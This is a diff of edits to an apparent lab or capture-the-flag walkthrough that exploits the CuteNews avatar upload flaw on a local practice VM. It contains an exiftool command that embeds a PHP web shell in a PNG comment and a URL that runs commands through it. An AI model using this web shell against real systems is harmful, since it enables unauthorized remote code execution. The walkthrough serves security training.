@@ -11,7 +11,7 @@ So after you fire up the vm, give it a few minutes to start up all services. Aft
 ```
 netdiscover
 ```
-came up  with the VM's IP : `192.168.1.2`
+came up  with the VM's IP : `192.168.1.9`
 
 Lets scan the VM with `nmap -sV` to check what services are exposed.
 ```
@@ -446,13 +446,13 @@ END_TIME: Wed Sep 23 08:03:19 2020
 DOWNLOADED: 368960 - FOUND: 83
 ```
 
-There's an interesting result here: `http://192.168.1.9/index.php`. It's actually a login pahe with a register option!. Lets create a fake account to get access.
+There's an interesting result here: `http://192.168.1.9/index.php`. It's actually a login page with a register option! Lets create a fake account to get access.
 
 Navigating around the personal options, after we create a fake account, we see that we can upload a custom avatar. (This is also a known vulnerability of cutePHP Cutenews. You can find it [here](https://www.exploit-db.com/exploits/48458)).
 
 Lets create a `php` payload inside a `png` image, upload it and see if we can get a shell to the system.
 
-First download a random png image, the embed the php payload in it with:
+First download a random png image, then embed the php payload in it with:
 ```
 $ exiftool -v -Comment='<?php echo "<pre>";
 system($_GET["cmd"]); ?>' bad.png
@@ -473,6 +473,8 @@ test the remote code execution by navigating to:
 ```
 http://192.168.1.9/uploads/avatar_tester_bad.php?cmd=id
 ```
+> Replace tester with your username
+
 We get a response like this:
 ```
 �PNG  IHDR����p4tEXtComment
